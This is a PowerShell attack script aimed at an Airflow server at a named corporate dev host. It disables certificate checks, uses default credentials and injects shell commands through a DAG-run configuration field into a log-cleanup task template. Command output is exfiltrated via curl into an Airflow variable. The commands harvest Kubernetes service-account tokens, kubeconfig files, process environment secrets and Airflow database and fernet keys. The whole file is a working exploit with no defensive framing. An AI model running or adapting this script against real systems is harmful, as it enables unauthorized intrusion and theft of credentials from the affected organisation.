Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function AF-Get($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "GET"; $req.Headers.Add("Authorization", "Basic $encoded"); $req.Accept = "application/json"
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) { $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); return "ERR:" + $r.ReadToEnd() }
        return "EXC:" + $_.Exception.Message
    }
}

function AF-Post($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "POST"; $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) { $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); return "ERR:" + $r.ReadToEnd() }
        return "EXC:" + $_.Exception.Message
    }
}

function AF-Patch($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "PATCH"; $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) { $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); return "ERR:" + $r.ReadToEnd() }
        return "EXC:" + $_.Exception.Message
    }
}

function Run-Inject($cmd) {
    # Template: MAX_LOG_AGE_IN_DAYS="{{dag_run.conf.maxLogAgeInDays}}"
    # Inject: <number>"; INJECT_CMD; echo "
    $inject = "30`"; $cmd; echo `""
    $ts = [DateTimeOffset]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
    $body = @{
        conf = @{ maxLogAgeInDays = $inject }
        logical_date = $ts
    } | ConvertTo-Json -Depth 10
    $result = AF-Post "/api/v1/dags/maintenance_logs_cleanup/dagRuns" $body
    Start-Sleep 10
    $varResult = AF-Get "/api/v1/variables/_pwn_test"
    $val = ($varResult | ConvertFrom-Json).value
    return $val
}

function Exfil($cmd) {
    # Build command that exfils via Airflow variable
    $exfilCmd = "$cmd | head -c 2000 | base64 -w0 | xargs -I{} curl -sk -X PATCH $base/api/v1/variables/_pwn_test -H 'Authorization: Basic $encoded' -H 'Content-Type: application/json' -d '{`"key`":`"_pwn_test`",`"value`":`"{}`"}'"
    return Run-Inject $exfilCmd
}

# Explore filesystem
Write-Host "=== ID ==="
Write-Host (Exfil "id")

Write-Host "`n=== ENV (K8s related) ==="
Write-Host (Exfil "env | grep -i 'kube\|k8s\|service_\|KUBE\|TOKEN\|SECRET\|NAMESPACE' | head -30")

Write-Host "`n=== SA TOKEN PATHS ==="
Write-Host (Exfil "find / -name 'token' -path '*/serviceaccount/*' 2>/dev/null | head -10")

Write-Host "`n=== LS /var/run/secrets ==="
Write-Host (Exfil "ls -la /var/run/secrets/ 2>&1 && find /var/run/secrets/ -type f 2>/dev/null | head -20")

Write-Host "`n=== KUBECONFIG ==="
Write-Host (Exfil "find / -name 'kubeconfig' -o -name '*.kubeconfig' 2>/dev/null | head -10; env | grep -i kube")

Write-Host "`n=== HOSTNAME AND IP ==="
Write-Host (Exfil "hostname -i; hostname; cat /etc/hosts | head -20")

Write-Host "`n=== /proc/self/environ ==="
Write-Host (Exfil "cat /proc/self/environ | tr '\0' '\n' | grep -i 'kube\|k8s\|token\|secret\|auth\|namespace' | head -20")

Write-Host "`n=== AIRFLOW ENV VARS ==="
Write-Host (Exfil "env | grep -i 'airflow\|sql_alchemy\|fernet\|secret\|database\|redis' | head -30")
